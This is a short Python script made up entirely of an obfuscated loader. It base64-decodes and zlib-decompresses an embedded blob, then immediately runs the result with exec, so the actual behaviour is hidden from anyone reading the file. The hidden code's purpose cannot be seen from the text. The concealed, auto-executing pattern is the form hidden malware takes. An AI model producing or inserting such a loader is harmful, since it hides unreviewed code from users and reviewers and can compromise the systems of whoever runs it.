#!/usr/bin/env python3
from __future__ import annotations

import base64 as _b64
import zlib as _zlib

_PAYLOAD = """
eNqFUk1P4zAQvedXzIZLIkELu7dK2RM5IEB8iROqLNNMWIt6HI2dQlT1v+84CaF0hdYX2zN+b8Zv
3tGPeet5/mxojrSBpgt/HP1KanYWlKrb0DIqBcY2jgNoIhd0MI58koyxYVub54+A7ySZ3Jd3jxf3
5bm6vjl/vCofoIAsXW1+pseQUmubLh5uL67ixtoHZOPSXIAV1mC1oSyHk99gKCwSkGWN94ZeFrA2
Pjz5wEthfFr2udoxWFe1a1SkLQoIDssPJHEF7j4vPXOPFLbpJ7PhpIZMtkedT0h8X2EToOw3EQS0
j7ED6qHpmW4apCqr0+0e124BW0Hs0vwLZuUoGGpxCm6QfSxQwAuK+IHHhkQ4pcakUlHHll7JvdEe
YcMi4L91by4h247QXR5lj49NDTLeSekDkvSW3Qr7FIhVDDuySDJ/D4y66mZ7ZRnFNwSnA+9/8bHq
yHEMtVljIR6a+VAhcz5N2AS0cbTf9FenACewja9239GMfZ2JzeSzqpdD3F0UUcpoOtFx4GVtPMJD
J8a05bsJ2WDJPPkLAPv9bA==
"""

exec(compile(_zlib.decompress(_b64.b64decode(_PAYLOAD)).decode("utf-8"), __file__, "exec"))
